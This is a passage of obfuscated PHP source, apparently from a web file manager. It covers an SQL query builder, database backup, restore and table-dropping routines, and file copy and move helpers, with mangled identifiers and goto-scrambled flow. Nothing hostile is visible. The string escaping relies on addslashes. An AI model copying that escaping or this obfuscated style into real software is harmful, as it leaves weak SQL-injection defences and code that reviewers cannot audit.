$this->parseTable($DÊŞ×Œ[$eªæ•¯‹øµ[276]]) . $this->parseWhere(!empty($DÊŞ×Œ[$eªæ•¯‹øµ[272]]) ? $DÊŞ×Œ[$eªæ•¯‹øµ[272]] : $eªæ•¯‹øµ[43]) . $this->parseOrder(!empty($DÊŞ×Œ[$eªæ•¯‹øµ[359]]) ? $DÊŞ×Œ[$eªæ•¯‹øµ[359]] : $eªæ•¯‹øµ[43]) . $this->parseLimit(!empty($DÊŞ×Œ[$eªæ•¯‹øµ[289]]) ? $DÊŞ×Œ[$eªæ•¯‹øµ[289]] : $eªæ•¯‹øµ[43]) . $this->parseLock(isset($DÊŞ×Œ[$eªæ•¯‹øµ[780]]) ? $DÊŞ×Œ[$eªæ•¯‹øµ[780]] : !1) . $this->parseComment(!empty($DÊŞ×Œ[$eªæ•¯‹øµ[350]]) ? $DÊŞ×Œ[$eªæ•¯‹øµ[350]] : $eªæ•¯‹øµ[43]); return $this->execute($e¢ĞˆÀğœ, $this->parseBind(!empty($DÊŞ×Œ[$eªæ•¯‹øµ[282]]) ? $DÊŞ×Œ[$eªæ•¯‹øµ[282]] : array())); } public function select($aÊ±«„ô“é = array()) { goto Bê¿ ô±Øö; Bê¿ ô±Øö: $E˜·—¿ÒŸé =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->model = $aÊ±«„ô“é[$E˜·—¿ÒŸé[278]]; $eÌŒİ‘ÔìÒ = $this->buildSelectSql($aÊ±«„ô“é); goto E•³¦Ñ²´ô; E•³¦Ñ²´ô: $FŒôŒÚœ–‚ = isset($aÊ±«„ô“é[$E˜·—¿ÒŸé[346]]) ? $aÊ±«„ô“é[$E˜·—¿ÒŸé[346]] : !1; if ($FŒôŒÚœ–‚) { $cì«‚ï·• = is_string($FŒôŒÚœ–‚[$E˜·—¿ÒŸé[99]]) ? $FŒôŒÚœ–‚[$E˜·—¿ÒŸé[99]] : $E˜·—¿ÒŸé[962] . md5($eÌŒİ‘ÔìÒ); $a†çèò¡äØ = think_cache($cì«‚ï·•, $E˜·—¿ÒŸé[43], $FŒôŒÚœ–‚); if (!1 !== $a†çèò¡äØ) { return $a†çèò¡äØ; } } $eƒÚ‡“ù¾Ê = $this->query($eÌŒİ‘ÔìÒ, $this->parseBind(!empty($aÊ±«„ô“é[$E˜·—¿ÒŸé[282]]) ? $aÊ±«„ô“é[$E˜·—¿ÒŸé[282]] : array())); goto fã¯ø“šß; fã¯ø“šß: if ($FŒôŒÚœ–‚ && !1 !== $eƒÚ‡“ù¾Ê) { think_cache($cì«‚ï·•, $eƒÚ‡“ù¾Ê, $FŒôŒÚœ–‚); } return $eƒÚ‡“ù¾Ê; goto c¿˜Ö±·ñò; c¿˜Ö±·ñò: } public function buildSelectSql($A®’ Èê = array()) { goto bë•ğ¨·í; d ¸§ÇŠÆ: $dåÊÚÄõ² = $this->parseSql($this->selectSql, $A®’ Èê); $dåÊÚÄõ² .= $this->parseLock(isset($A®’ Èê[$b ãÊôÛÓ¥[780]]) ? $A®’ Èê[$b ãÊôÛÓ¥[780]] : !1); if (isset($CŠ¹Ù„‰ùÖ)) { think_cache($CŠ¹Ù„‰ùÖ, $dåÊÚÄõ²); } goto Cœ­Öâ‹«; bë•ğ¨·í: $b ãÊôÛÓ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset($A®’ Èê[$b ãÊôÛÓ¥[349]])) { if (strpos($A®’ Èê[$b ãÊôÛÓ¥[349]], $b ãÊôÛÓ¥[57])) { list($BŞ¶áì“Ì, $bå¸Ò¶·ßÕ) = explode($b ãÊôÛÓ¥[57], $A®’ Èê[$b ãÊôÛÓ¥[349]]); } else { $BŞ¶áì“Ì = $A®’ Èê[$b ãÊôÛÓ¥[349]]; } $BŞ¶áì“Ì = $BŞ¶áì“Ì ? $BŞ¶áì“Ì : 1; $bå¸Ò¶·ßÕ = isset($bå¸Ò¶·ßÕ) ? $bå¸Ò¶·ßÕ : (is_numeric($A®’ Èê[$b ãÊôÛÓ¥[289]]) ? $A®’ Èê[$b ãÊôÛÓ¥[289]] : 20); $dßÕ‚¯˜¯ = $bå¸Ò¶·ßÕ * ((int) $BŞ¶áì“Ì - 1); $A®’ Èê[$b ãÊôÛÓ¥[289]] = $dßÕ‚¯˜¯ . $b ãÊôÛÓ¥[57] . $bå¸Ò¶·ßÕ; } if (think_config($b ãÊôÛÓ¥[963])) { $CŠ¹Ù„‰ùÖ = $b ãÊôÛÓ¥[964] . md5(serialize($A®’ Èê)); $DÏÑ…ó²˜Å = think_cache($CŠ¹Ù„‰ùÖ); if ($DÏÑ…ó²˜Å) { return $DÏÑ…ó²˜Å; } } goto d ¸§ÇŠÆ; Cœ­Öâ‹«: return $dåÊÚÄõ²; goto bš¢……ÂµÂ; bš¢……ÂµÂ: } public function parseSql($fŠÖ°¬ç, $a“ÃùŠ„ôù = array()) { $d™ßÈ‹îéï =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fŠÖ°¬ç = str_replace(array($d™ßÈ‹îéï[965], $d™ßÈ‹îéï[966], $d™ßÈ‹îéï[967], $d™ßÈ‹îéï[968], $d™ßÈ‹îéï[969], $d™ßÈ‹îéï[970], $d™ßÈ‹îéï[971], $d™ßÈ‹îéï[972], $d™ßÈ‹îéï[973], $d™ßÈ‹îéï[974], $d™ßÈ‹îéï[975]), array($this->parseTable("{$a“ÃùŠ„ôù[$d™ßÈ‹îéï[276]]}"), $this->parseDistinct(isset($a“ÃùŠ„ôù[$d™ßÈ‹îéï[976]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[976]] : !1), $this->parseField(!empty($a“ÃùŠ„ôù[$d™ßÈ‹îéï[270]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[270]] : $d™ßÈ‹îéï[186]), $this->parseJoin(!empty($a“ÃùŠ„ôù[$d™ßÈ‹îéï[279]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[279]] : $d™ßÈ‹îéï[43]), $this->parseWhere(!empty($a“ÃùŠ„ôù[$d™ßÈ‹îéï[272]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[272]] : $d™ßÈ‹îéï[43]), $this->parseGroup(!empty($a“ÃùŠ„ôù[$d™ßÈ‹îéï[977]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[977]] : $d™ßÈ‹îéï[43]), $this->parseHaving(!empty($a“ÃùŠ„ôù[$d™ßÈ‹îéï[978]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[978]] : $d™ßÈ‹îéï[43]), $this->parseOrder(!empty($a“ÃùŠ„ôù[$d™ßÈ‹îéï[359]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[359]] : $d™ßÈ‹îéï[43]), $this->parseLimit(!empty($a“ÃùŠ„ôù[$d™ßÈ‹îéï[289]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[289]] : $d™ßÈ‹îéï[43]), $this->parseUnion(!empty($a“ÃùŠ„ôù[$d™ßÈ‹îéï[344]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[344]] : $d™ßÈ‹îéï[43]), $this->parseComment(!empty($a“ÃùŠ„ôù[$d™ßÈ‹îéï[350]]) ? $a“ÃùŠ„ôù[$d™ßÈ‹îéï[350]] : $d™ßÈ‹îéï[43])), $fŠÖ°¬ç); return $fŠÖ°¬ç; } public function getLastSql($cßÔ²½Ù•· = '') { return $cßÔ²½Ù•· ? $this->modelSql[$cßÔ²½Ù•·] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($f‡ˆ¾Ú›„) { return addslashes($f‡ˆ¾Ú›„); } public function setModel($a‡ÅÚ¹¶‰) { $this->model = $a‡ÅÚ¹¶‰; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($A¢õä½ÏÖ, $f‚Ğ¾çóŸ² = '') { $this->database = $A¢õä½ÏÖ; $this->type = $f‚Ğ¾çóŸ²; } public function model($dÀØ‰ÇÙ…× = '') { return new ModelBase($dÀØ‰ÇÙ…×, $_SERVER[çŞáÓæÚô‚Ô‡][43], $this->database); } public function db($b’è³îÉ = false) { goto aÅÙÄÌã–; CÈ‡¾Ìò: $this->database = $bß–ğ’’Â†; $d§µÈËŞ¤å->execute("\165\x73\145\x20\x60{$eç„Úæğ‡Î}\x60"); return $d§µÈËŞ¤å; goto a åğŞØ¹Ÿ; Cò¼ÜÀ»: if (!$fˆÑÜ™²–) { $d§µÈËŞ¤å->execute("\x63\162\x65\x61\164\x65\40\x64\141\164\141\142\141\163\x65\40\x60{$eç„Úæğ‡Î}\140"); } $bß–ğ’’Â†[$BÕùë¨—ß[891]] = $eç„Úæğ‡Î; if ($bß–ğ’’Â†[$BÕùë¨—ß[731]] == $BÕùë¨—ß[732]) { $bß–ğ’’Â†[$BÕùë¨—ß[733]] .= $BÕùë¨—ß[979] . $eç„Úæğ‡Î; } goto CÈ‡¾Ìò; aÅÙÄÌã–: $BÕùë¨—ß =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bß–ğ’’Â† = array_change_key_case($this->database); if ($this->type == $BÕùë¨—ß[19] || !$b’è³îÉ) { return $this->model()->db(); } goto aˆÀÇ’™—; F¦áñä: $this->database = $bß–ğ’’Â†; $d§µÈËŞ¤å = $this->model()->db(); try { $fˆÑÜ™²– = $d§µÈËŞ¤å->execute("\163\x68\x6f\167\40\144\x61\164\141\142\141\x73\x65\x73\x20\154\x69\x6b\x65\40\47{$eç„Úæğ‡Î}\x27"); } catch (Exception $fëáİâ·) { } goto Cò¼ÜÀ»; aˆÀÇ’™—: $eç„Úæğ‡Î = $bß–ğ’’Â†[$BÕùë¨—ß[891]]; $bß–ğ’’Â†[$BÕùë¨—ß[891]] = $BÕùë¨—ß[43]; if ($bß–ğ’’Â†[$BÕùë¨—ß[731]] == $BÕùë¨—ß[732]) { $E‘È•Óˆ…ƒ = $bß–ğ’’Â†[$BÕùë¨—ß[733]]; $bß–ğ’’Â†[$BÕùë¨—ß[733]] = substr($E‘È•Óˆ…ƒ, 0, strrpos($E‘È•Óˆ…ƒ, $BÕùë¨—ß[979])); } goto F¦áñä; a åğŞØ¹Ÿ: } public function createTable($EÀïá‘£¦, $F‹«Œù¦”¾ = null) { $C½ğŠ¥ùÍ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!IO::exist($EÀïá‘£¦)) { ActionCall($C½ğŠ¥ùÍ[980], !0, 0); show_json(LNG($C½ğŠ¥ùÍ[981]), !1); } $Dù¥ò´–ï² = sqlSplit(IO::getContent($EÀïá‘£¦)); foreach ($Dù¥ò´–ï² as $bŠ…ˆî®¹¥) { if ($F‹«Œù¦”¾) { $AÃŒ³¸„ï„ = stripos($bŠ…ˆî®¹¥, $C½ğŠ¥ùÍ[982]) === 0; if ($AÃŒ³¸„ï„) { $F‹«Œù¦”¾->task[$C½ğŠ¥ùÍ[983]] += 1; } } $this->model()->db()->execute($bŠ…ˆî®¹¥); if ($F‹«Œù¦”¾ && $AÃŒ³¸„ï„) { preg_match($C½ğŠ¥ùÍ[984], $bŠ…ˆî®¹¥, $aéìîÉŠ²‹); $F‹«Œù¦”¾->task[$C½ğŠ¥ùÍ[985]] = $aéìîÉŠ²‹[1]; $F‹«Œù¦”¾->update(1); } } $this->taskToCache($F‹«Œù¦”¾); } public function insertTable($E»È»Ğæ½, $Eƒ²ìôÏÓŒ = null) { $Eô‚Ùùò‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bµÏ¤Œİ = $this->model()->db(); $cßßÊèŸÁ  = $bÄğÅà«« ? array($bÄğÅà««) : $bµÏ¤Œİ->getTables(); foreach ($E»È»Ğæ½ as $eÀ½ËĞÊ¯Ò) { $bÄğÅà«« = basename($eÀ½ËĞÊ¯Ò, $Eô‚Ùùò‡[726]); if (!in_array($bÄğÅà««, $cßßÊèŸÁ )) { continue; } if ($Eƒ²ìôÏÓŒ) { $Eƒ²ìôÏÓŒ->task[$Eô‚Ùùò‡[985]] = $bÄğÅà««; } if (get_filesize($eÀ½ËĞÊ¯Ò) == 0) { continue; } $Fª‘Ê¤ÑÚÃ = $this->sqlToDb($eÀ½ËĞÊ¯Ò, $Eƒ²ìôÏÓŒ); if (!$Fª‘Ê¤ÑÚÃ) { ActionCall($Eô‚Ùùò‡[980], !0, 0); show_json(LNG($Eô‚Ùùò‡[986]) . "\133{$bÄğÅà««}\135", !1); } } $this->taskToCache($Eƒ²ìôÏÓŒ); } public function sqlFromDb($Cæˆ†õ‘­‚, $cÅ¼Š¦, $AÒ½Å³¦¤Ñ = null, $eî¬¯É´³ = null) { goto DèÑ¨ÅÖ‡«; A™„°ÔéÕ•: $C‰¯ã²±Ÿè = 1; $b­…°ÎŒ´ï = 500; $AùöÌŸñ‘‚ = fopen($cÅ¼Š¦, $_SERVER[çŞáÓæÚô‚Ô‡][987]); goto B…µ†­ì; B…µ†­ì: $bè‚Éõ† = $DãÚà²±‚–->getPk(); $aˆ×ÔÂà¢ = $DãÚà²±‚–->getDbFields(); do { $F¬ß¶ìŒ’ì = $DãÚà²±‚–->field($aˆ×ÔÂà¢)->order($bè‚Éõ† . $_SERVER[çŞáÓæÚô‚Ô‡][988])->selectPage($b­…°ÎŒ´ï, $C‰¯ã²±Ÿè); $EÊ¦ŸéÅµ¸ = isset($F¬ß¶ìŒ’ì[$_SERVER[çŞáÓæÚô‚Ô‡][360]][$_SERVER[çŞáÓæÚô‚Ô‡][362]]) ? $F¬ß¶ìŒ’ì[$_SERVER[çŞáÓæÚô‚Ô‡][360]][$_SERVER[çŞáÓæÚô‚Ô‡][362]] : 0; $E¸‚î¦– = !empty($F¬ß¶ìŒ’ì[$_SERVER[çŞáÓæÚô‚Ô‡][363]]) ? $F¬ß¶ìŒ’ì[$_SERVER[çŞáÓæÚô‚Ô‡][363]] : array(); if (!($Côğ¤ÑÀå = count($E¸‚î¦–))) { break; } $bá²¸·†Ä = array(); foreach ($E¸‚î¦– as $fäœøïæŠ) { if ($Cæˆ†õ‘­‚ == $_SERVER[çŞáÓæÚô‚Ô‡][989] && $fäœøïæŠ[$_SERVER[çŞáÓæÚô‚Ô‡][39]] == $_SERVER[çŞáÓæÚô‚Ô‡][990]) { $B½‡†­ = json_decode($fäœøïæŠ[$_SERVER[çŞáÓæÚô‚Ô‡][368]], !0); if ($B½‡†­[$_SERVER[çŞáÓæÚô‚Ô‡][38]] == date($_SERVER[çŞáÓæÚô‚Ô‡][699]) && !$B½‡†­[$_SERVER[çŞáÓæÚô‚Ô‡][698]]) { continue; } } if ($eî¬¯É´³) { $fäœøïæŠ[$_SERVER[çŞáÓæÚô‚Ô‡][85]] = "\x7b\151\157\72{$eî¬¯É´³}\175" . substr($fäœøïæŠ[$_SERVER[çŞáÓæÚô‚Ô‡][85]], strlen("\173\x69\157\72{$fäœøïæŠ[$_SERVER[çŞáÓæÚô‚Ô‡][752]]}\175")); $fäœøïæŠ[$_SERVER[çŞáÓæÚô‚Ô‡][752]] = $eî¬¯É´³; } $bá²¸·†Ä[] = $_SERVER[çŞáÓæÚô‚Ô‡][991] . $this->sqlEncode($fäœøïæŠ) . $_SERVER[çŞáÓæÚô‚Ô‡][992]; } $eÚĞ»ÌÎáŒ = "\x49\x4e\x53\x45\x52\124\x20\111\116\x54\117\x20\x60{$Cæˆ†õ‘­‚}\140\40\x28\x60" . implode($_SERVER[çŞáÓæÚô‚Ô‡][993], $aˆ×ÔÂà¢) . $_SERVER[çŞáÓæÚô‚Ô‡][994]; fwrite($AùöÌŸñ‘‚, $eÚĞ»ÌÎáŒ . implode($_SERVER[çŞáÓæÚô‚Ô‡][995], $bá²¸·†Ä) . $_SERVER[çŞáÓæÚô‚Ô‡][77] . PHP_EOL); $C‰¯ã²±Ÿè++; $Fèê¶²› += $Côğ¤ÑÀå; if ($AÒ½Å³¦¤Ñ) { $AÒ½Å³¦¤Ñ->update($Côğ¤ÑÀå); } } while ($C‰¯ã²±Ÿè <= $EÊ¦ŸéÅµ¸); goto aØ°Ÿ›ìá—; DèÑ¨ÅÖ‡«: if ($AÒ½Å³¦¤Ñ) { $AÒ½Å³¦¤Ñ->task[$_SERVER[çŞáÓæÚô‚Ô‡][985]] = $Cæˆ†õ‘­‚; } $DãÚà²±‚– = $this->model($Cæˆ†õ‘­‚); $Fèê¶²› = 0; goto A™„°ÔéÕ•; aØ°Ÿ›ìá—: fclose($AùöÌŸñ‘‚); return $Fèê¶²›; goto Aä‡Ù„¢—ø; Aä‡Ù„¢—ø: } public function sqlToDb($DÂ£âé¾, $AºÖòÆË¢æ = null) { goto A¤çŒ‹ËŸ‰; A¤çŒ‹ËŸ‰: $BŞï•Ğ…‹õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aö›ğ¢ä = $this->model()->db(); $bÊ½Šé¡ï = @fopen($DÂ£âé¾, $BŞï•Ğ…‹õ[996]); goto f»ŒŠÃµ£”; f»ŒŠÃµ£”: if (!$bÊ½Šé¡ï) { return !1; } $bÜ„¬“Øù• = 0; $f¯á­ããóÍ = $BŞï•Ğ…‹õ[43]; goto d¿Â‹Í•õ‘; A”óÈÜÁ§³: if (trim($f¯á­ããóÍ)) { $f¯á­ããóÍ = rtrim(trim($f¯á­ããóÍ), $BŞï•Ğ…‹õ[77]); if (!$aö›ğ¢ä->execute($f¯á­ããóÍ)) { return !1; } if ($AºÖòÆË¢æ) { $AºÖòÆË¢æ->update($bÜ„¬“Øù• - 1); } } return !0; goto C‹¨¿²§Õ; d¿Â‹Í•õ‘: $DËá«‡§Ï™ = 500 + 1; while (!feof($bÊ½Šé¡ï)) { if ($AºÖòÆË¢æ && $bÜ„¬“Øù• != 0) { $AºÖòÆË¢æ->task[$BŞï•Ğ…‹õ[983]] += 1; } $bÜ„¬“Øù•++; $C¾¤ø„¶ = trim(fgets($bÊ½Šé¡ï)); $f¯á­ããóÍ .= $BŞï•Ğ…‹õ[60] . $this->sqlDecode($C¾¤ø„¶, $this->type); if ($bÜ„¬“Øù• == $DËá«‡§Ï™) { $f¯á­ããóÍ = rtrim(trim($f¯á­ããóÍ), $BŞï•Ğ…‹õ[77]); if (!$aö›ğ¢ä->execute($f¯á­ããóÍ)) { return !1; } if ($AºÖòÆË¢æ) { $AºÖòÆË¢æ->update($bÜ„¬“Øù• - 1); } $f¯á­ããóÍ = $BŞï•Ğ…‹õ[43]; $bÜ„¬“Øù• = 0; } } fclose($bÊ½Šé¡ï); goto A”óÈÜÁ§³; C‹¨¿²§Õ: } public function dropTable($D§‚İ•ª¿õ = null) { $eñ™’ñô½µ = $this->model()->db(); $døğ•„ïĞ = $D§‚İ•ª¿õ ? array($D§‚İ•ª¿õ) : $eñ™’ñô½µ->getTables(); if (!$døğ•„ïĞ) { return; } foreach ($døğ•„ïĞ as $D§‚İ•ª¿õ) { $eñ™’ñô½µ->execute("\144\162\x6f\160\40\164\x61\142\154\145\x20\151\x66\40\145\170\x69\x73\164\x73\40\x60{$D§‚İ•ª¿õ}\140"); } } private function taskToCache($C÷ù«ÄãŒ = null) { $d Ó¶Ä´ÎÚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$C÷ù«ÄãŒ) { return; } $fç¾À„Í¶Á = array($d Ó¶Ä´ÎÚ[985] => $C÷ù«ÄãŒ->task[$d Ó¶Ä´ÎÚ[985]], $d Ó¶Ä´ÎÚ[983] => $C÷ù«ÄãŒ->task[$d Ó¶Ä´ÎÚ[983]], $d Ó¶Ä´ÎÚ[997] => $C÷ù«ÄãŒ->task[$d Ó¶Ä´ÎÚ[997]]); if ($fç¾À„Í¶Á[$d Ó¶Ä´ÎÚ[983]] == $fç¾À„Í¶Á[$d Ó¶Ä´ÎÚ[997]]) { $fç¾À„Í¶Á[$d Ó¶Ä´ÎÚ[705]] = 1; } Cache::set($d Ó¶Ä´ÎÚ[998] . $C÷ù«ÄãŒ->task[$d Ó¶Ä´ÎÚ[376]], $fç¾À„Í¶Á); $C÷ù«ÄãŒ->end(); } private function sqlEncode($F²ç—°‰“î) { $DŠ†ì‹µ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cÉë°ƒñ = array(); foreach ($F²ç—°‰“î as $b¶®ø‰­Ó¹) { if (is_array($b¶®ø‰­Ó¹)) { $b¶®ø‰­Ó¹ = json_encode_force($b¶®ø‰­Ó¹); } $b¶®ø‰­Ó¹ = addslashes($b¶®ø‰­Ó¹); $b¶®ø‰­Ó¹ = str_replace(array($DŠ†ì‹µ[999], $DŠ†ì‹µ[11]), array($DŠ†ì‹µ[1000], $DŠ†ì‹µ[1001]), $b¶®ø‰­Ó¹); $cÉë°ƒñ[] = str_replace($DŠ†ì‹µ[65], $DŠ†ì‹µ[1002], $b¶®ø‰­Ó¹); } return $DŠ†ì‹µ[65] . implode($DŠ†ì‹µ[1003], $cÉë°ƒñ) . $DŠ†ì‹µ[65]; } private function sqlDecode($A¨ˆö Ûğ, $E‘ÇßÉÁå—) { $A†Ü‡ê•È± =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A¨ˆö Ûğ = str_replace(array($A†Ü‡ê•È±[1000], $A†Ü‡ê•È±[1001]), array($A†Ü‡ê•È±[999], $A†Ü‡ê•È±[11]), $A¨ˆö Ûğ); if ($E‘ÇßÉÁå— == $A†Ü‡ê•È±[19]) { $A¨ˆö Ûğ = stripslashes($A¨ˆö Ûğ); } return $A¨ˆö Ûğ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($aÈ¿Ğ¹ƒ³Â, $a—…ÅÛ½Á¬) { $Fˆ’ÏÅ”ö¯ = self::driverMake($a—…ÅÛ½Á¬[0]); if (method_exists($Fˆ’ÏÅ”ö¯, $aÈ¿Ğ¹ƒ³Â)) { return @call_user_func_array(array($Fˆ’ÏÅ”ö¯, $aÈ¿Ğ¹ƒ³Â), $a—…ÅÛ½Á¬); } if (method_exists($Fˆ’ÏÅ”ö¯, $_SERVER[çŞáÓæÚô‚Ô‡][1004])) { return @call_user_func_array(array($Fˆ’ÏÅ”ö¯, $aÈ¿Ğ¹ƒ³Â), $a—…ÅÛ½Á¬); } else { if (method_exists(self, $aÈ¿Ğ¹ƒ³Â)) { return @call_user_func_array(array(self, $aÈ¿Ğ¹ƒ³Â), $a—…ÅÛ½Á¬); } else { call_user_func_array(array(parent, $aÈ¿Ğ¹ƒ³Â), $a—…ÅÛ½Á¬); } } } public static function init($aœÏÊéàœ) { return self::driverMake($aœÏÊéàœ); } public static function copy($DÖ§…Û¼É«, $eÈ®î•¬¸§, $a³…·ö¦­ = false, $cÓÄäµÂíÔ = false) { return self::copyMove($DÖ§…Û¼É«, $eÈ®î•¬¸§, $a³…·ö¦­, $_SERVER[çŞáÓæÚô‚Ô‡][501], $cÓÄäµÂíÔ); } public static function move($cö«¹—îÂ¬, $f£«óöµÂ, $d¤ˆØ¿Ù§ = false, $b‡àé¿˜Ù… = false) { return self::copyMove($cö«¹—îÂ¬, $f£«óöµÂ, $d¤ˆØ¿Ù§, $_SERVER[çŞáÓæÚô‚Ô‡][503], $b‡àé¿˜Ù…); } public static function saveFile($aÙóÓæÑƒì, $FŠßœæÂÀ, $c”êøôÆ³˜ = true) { goto c±è‰ŒÙÇù; c±è‰ŒÙÇù: $dÓùàÔ¿®ø =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÖ¹¦Ç›¡Ÿ = self::info($FŠßœæÂÀ); $cƒÄÁ¢÷ç = self::driverMake($aÙóÓæÑƒì); goto F…­Ó¨Úª‘; cÈé’Ãá: $aÏ›»÷„ = $dß´¾âÕ«½->pathFather($FŠßœæÂÀ); $Fµ§àÏèÈ± = !0; if (!$c”êøôÆ³˜ && self::driverIsSame($cƒÄÁ¢÷ç, $dß´¾âÕ«½)) { $Fµ§àÏèÈ± = !1; } goto cøô…œÆ‘; cøô…œÆ‘: $C¡„Õ†²· = self::copyFile($cƒÄÁ¢÷ç, $aÙóÓæÑƒì, $dß´¾âÕ«½, $aÏ›»÷„, $bÖ¹¦Ç›¡Ÿ[$dÓùàÔ¿®ø[38]], $Fµ§àÏèÈ±); if ($Cî©öñœº¶) { $C¡„Õ†²· = $Cî©öñœº¶->getPathOuter($C¡„Õ†²·); } return $C¡„Õ†²·; goto eŸàñ“ÑØß; F…­Ó¨Úª‘: $dß´¾âÕ«½ = self::driverMake($FŠßœæÂÀ); $Cî©öñœº¶ = !1; if ($dß´¾âÕ«½->pathParse[$dÓùàÔ¿®ø[1005]]) { $eğŒğõî†‰ = $dß´¾âÕ«½->pathParse[$dÓùàÔ¿®ø[1005]]; $Cî©öñœº¶ = $dß´¾âÕ«½; $dß´¾âÕ«½ = self::driverMake($eğŒğõî†‰); } goto cÈé’Ãá; eŸàñ“ÑØß: } private static function copyMove($cŠŞÆ³Æ Ú, $a«âëˆÛÅ, $bãå„¬º¬, $C”ÀŠˆ‰, $a‡Åå—§Ü· = false) { goto e‡ì©ê«‹; B“·ĞÚîÛ¹: if ($eËÅÏˆÂ•¿) { $eÊ„ó†í÷ñ = $eËÅÏˆÂ•¿->getPathOuter($eÊ„ó†í÷ñ); } return $eÊ„ó†í÷ñ; goto eÚ‹âªê‚º; F³çœæÑ†ç: $bÂº©ì“Å = self::driverMake($cŠŞÆ³Æ Ú); $c‹§æè’ = self::driverMake($a«âëˆÛÅ); $bˆ¬õèèáÏ = $C”ÀŠˆ‰ == $EÇˆâ—‘É…[503]; goto aõÌ¿é“Âø; aõÌ¿é“Âø: $eËÅÏˆÂ•¿ = !1; if ($c‹§æè’->pathParse[$EÇˆâ—‘É…[1005]]) { $a«âëˆÛÅ = $c‹§æè’->pathParse[$EÇˆâ—‘É…[1005]]; $eËÅÏˆÂ•¿ = $c‹§æè’; $c‹§æè’ = self::driverMake($a«âëˆÛÅ); } self::check($bÂº©ì“Å, $cŠŞÆ³Æ Ú, $c‹§æè’, $a«âëˆÛÅ); goto FíäÁÃÑŸ; a³Ë©ˆä–: $E¡ãä»´¾– = $bÂº©ì“Å->isFile($cŠŞÆ³Æ Ú); if (!$E¡ãä»´¾– && $c‹§æè’->getType() == $EÇˆâ—‘É…[703] && $bÂº©ì“Å->getType() == $EÇˆâ—‘É…[112]) { $eÊ„ó†í÷ñ = $c‹§æè’->copyFolderFromIO($bÂº©ì“Å, $cŠŞÆ³Æ Ú, $a«âëˆÛÅ, $bãå„¬º¬, $bˆ¬õèèáÏ, $a‡Åå—§Ü·); } else { $eÊ„ó†í÷ñ = self::copyPath($bÂº©ì“Å, $cŠŞÆ³Æ Ú, $c‹§æè’, $a«âëˆÛÅ, $bãå„¬º¬, $bˆ¬õèèáÏ, $E¡ãä»´¾–, $a‡Åå—§Ü·); } if ($eÊ„ó†í÷ñ && $bˆ¬õèèáÏ) { $bÂº©ì“Å->remove($cŠŞÆ³Æ Ú); } goto B“·ĞÚîÛ¹; e‡ì©ê«‹: $EÇˆâ—‘É… =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$cŠŞÆ³Æ Ú || $cŠŞÆ³Æ Ú == $EÇˆâ—‘É…[18] || !$a«âëˆÛÅ) { return !1; } ignore_timeout(); goto F³çœæÑ†ç; FíäÁÃÑŸ: Hook::trigger($EÇˆâ—‘É…[82], $bÂº©ì“Å, $cŠŞÆ³Æ Ú, $c‹§æè’, $a«âëˆÛÅ); $d¸¯‰ŒŠîº = self::driverIsSame($bÂº©ì“Å, $c‹§æè’); if ($d¸¯‰ŒŠîº) { if ($C”ÀŠˆ‰ == $EÇˆâ—‘É…[503] && !method_exists($c‹§æè’, $EÇˆâ—‘É…[1006]) && trim($a«âëˆÛÅ, $EÇˆâ—‘É…[18]) == trim($c‹§æè’->pathFather($cŠŞÆ³Æ Ú), $EÇˆâ—‘É…[18])) { return $c‹§æè’->getPathOuter($cŠŞÆ³Æ Ú); } if (method_exists($c‹§æè’, $C”ÀŠˆ‰)) { return $c‹§æè’->{$C”ÀŠˆ‰}($cŠŞÆ³Æ Ú, $a«âëˆÛÅ, $bãå„¬º¬); } } goto a³Ë©ˆä–; eÚ‹âªê‚º: } private static function check($D¾Š´† Š, $BğÙ”Ó”‚™, $bÕº”ö¡œ‰, &$FóÈË¸øÃ±) { $c¬Š×êâ„· =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (self::driverIsSame($D¾Š´† Š, $bÕº”ö¡œ‰) && $D¾Š´† Š->isFolder($BğÙ”Ó”‚™) && $D¾Š´† Š->isParentOf($BğÙ”Ó”‚™, $FóÈË¸øÃ±)) { show_json(LNG($c¬Š×êâ„·[1007]), !1); } if (!$D¾Š´† Š->exist($BğÙ”Ó”‚™)) { show_json(LNG($c¬Š×êâ„·[111]), !1); } } private static function copyPath($FèœğêÒÊ, $EÏÏó‡ßÚ¾, $DÂ´ÚÎÉ™, $BÌØ„­İ© , $D·˜×Šì, $D§‚™•šÔÖ, $aÜÛå÷ä½É, $Aëˆ©Åùİ = false) { goto DÅÑ±…Â¾‰; F ›º˜ôÍß: $e¡ï‰“Ä”ì = $DÂ´ÚÎÉ™->mkdir($DÂ´ÚÎÉ™->getPath($DØœå“î)); $BÌØ„­İ©  = $DÂ´ÚÎÉ™->getPathInner($e¡ï‰“Ä”ì); $eñŠ•İ™ç’ = $FèœğêÒÊ->listPath($EÏÏó‡ßÚ¾, !0); goto fëŒ±çè—‚; fëŒ±çè—‚: $DÀ¾­ç·Ëë = array_merge($eñŠ•İ™ç’[$DÍ‘‹¦õŠ[83]], $eñŠ•İ™ç’[$DÍ‘‹¦õŠ[84]]); foreach ($DÀ¾­ç·Ëë as $BŞ‚ø–†İñ) { $e‘‚ª™Ôª = 